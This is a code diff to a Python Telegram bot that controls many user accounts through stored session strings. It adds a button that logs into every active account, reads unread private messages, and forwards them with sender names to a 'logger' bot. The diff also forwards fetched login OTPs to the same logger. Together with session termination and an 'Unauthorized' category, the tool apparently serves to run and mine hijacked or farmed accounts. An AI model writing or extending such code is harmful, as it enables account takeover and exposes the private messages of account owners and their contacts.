@@ -189,6 +189,15 @@ def load_data() -> Dict[str, Any]:
     for key, value in DEFAULT_DATA.items():
         data.setdefault(key, value)
         
+    # FORCED CATEGORY UPDATE (To ensure 5 categories always exist)
+    required_batches = ["Used", "Unused", "Fresh", "Admin", "Unauthorized"]
+    if "userbot_batches" in data:
+        for rb in required_batches:
+            if rb not in data["userbot_batches"]:
+                data["userbot_batches"].append(rb)
+    else:
+        data["userbot_batches"] = required_batches
+        
     for bname, bdata in list(data["batches"].items()):
         if isinstance(bdata, list):
             data["batches"][bname] = {
@@ -596,6 +605,7 @@ def userbots_keyboard() -> InlineKeyboardMarkup:
         kb.append([InlineKeyboardButton(f"📁 {b} Accounts", callback_data=f"ub_bview_{b}")])
         
     kb.append([InlineKeyboardButton("➕ Add Account", callback_data="ub_add_menu"), InlineKeyboardButton("🔄 Refresh All", callback_data="ub_refresh")])
+    kb.append([InlineKeyboardButton("📥 Get Latest DMs (All Accounts)", callback_data="ub_get_all_dms")])
     kb.append([InlineKeyboardButton("🔴 Switch OFF Accounts", callback_data="ub_global_off"), InlineKeyboardButton("🟢 Switch ON Accounts", callback_data="ub_global_on")])
     kb.append([InlineKeyboardButton("🤖 Check SpamBot (ALL)", callback_data="ub_spambot_all"), InlineKeyboardButton("🛑 Terminate Other Sessions", callback_data="ub_term_all")])
     kb.append([InlineKeyboardButton("📥 Backup All Sessions", callback_data="ub_backup_all")])
@@ -1182,13 +1192,51 @@ async def run_fetch_latest_otp(update: Update, context: ContextTypes.DEFAULT_TYP
             text = f"🔑 <b>Latest OTPs/Messages for {alias}:</b>\n\n"
             for i, m in enumerate(messages, 1):
                 text += f"<b>{i}.</b> <code>{m[:300]}</code>\n\n"
+            
+            # Send to logger
+            await send_to_logger(f"🚨 <b>MANUAL OTP FETCH</b>\n{text}")
+            
+            # Show on UI as well
+            ui_text = f"✅ <b>OTP Fetched and Sent to Logger Bot!</b>\n\n{text}"
         else:
-            text = f"❌ No recent Telegram OTP messages found for {alias}."
+            ui_text = f"❌ No recent Telegram OTP messages found for {alias}."
         
-        await update.callback_query.message.edit_text(text, parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
+        await update.callback_query.message.edit_text(ui_text, parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
     except Exception as e:
         await update.callback_query.message.edit_text(f"❌ Error fetching OTP: {e}", parse_mode="HTML", reply_markup=userbot_single_keyboard(ub_id))
 
+
+async def run_get_all_dms(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    data = load_data()
+    total_dms = 0
+    
+    for ub_id, info in data.get("userbots", {}).items():
+        if info.get("status") == "active" and not info.get("is_offline", False):
+            try:
+                client = Client(name=ub_id, session_string=info["session"], api_id=API_ID, api_hash=API_HASH, in_memory=True)
+                await client.connect()
+                
+                async for dialog in client.get_dialogs(limit=30):
+                    if dialog.chat and dialog.chat.type == enums.ChatType.PRIVATE and dialog.chat.id != 777000:
+                        unread = getattr(dialog, 'unread_messages_count', 0)
+                        if unread > 0:
+                            async for msg in client.get_chat_history(dialog.chat.id, limit=min(5, unread)):
+                                if not msg.outgoing:
+                                    sender_name = msg.from_user.first_name if msg.from_user else "Unknown"
+                                    username = f"@{msg.from_user.username}" if msg.from_user and msg.from_user.username else ""
+                                    content = msg.text or "<i>[Media / Non-text Message]</i>"
+                                    
+                                    await send_to_logger(f"📥 <b>FETCHED UNREAD DM</b>\n<b>Account:</b> {info['alias']}\n<b>From:</b> {sender_name} {username}\n<b>Message:</b>\n{content}")
+                                    total_dms += 1
+                                    await asyncio.sleep(0.5)
+                await client.disconnect()
+            except Exception as e:
+                logger.error(f"Error fetching DMs for {info.get('alias')}: {e}")
+    
+    try:
+        await update.callback_query.message.edit_text(f"✅ Finished checking DMs!\n\n📨 Total Unread DMs found & sent to Logger: <b>{total_dms}</b>", parse_mode="HTML", reply_markup=userbots_keyboard())
+    except Exception:
+        pass
 
 async def run_spambot_check(update: Update, context: ContextTypes.DEFAULT_TYPE, ub_id: str):
     data = load_data()
@@ -1642,6 +1690,12 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         save_data(data)
         await msg.edit_text(f"✅ Refresh Complete.\n\n🟢 Active: {active}\n🔴 Dead: {dead}\n(Offline accounts skipped)")
         await query.edit_message_reply_markup(reply_markup=userbots_keyboard())
+        return ConversationHandler.END
+
+    # --- GET LATEST UNREAD DMs BUTTON LOGIC ---
+    if cd == "ub_get_all_dms":
+        await query.edit_message_text("⏳ Fetching latest unread DMs from all active accounts...\nThis will check all bots and send messages to Logger. Please wait...", parse_mode="HTML")
+        asyncio.create_task(run_get_all_dms(update, context))
         return ConversationHandler.END
         
     if cd == "ub_spambot_all":
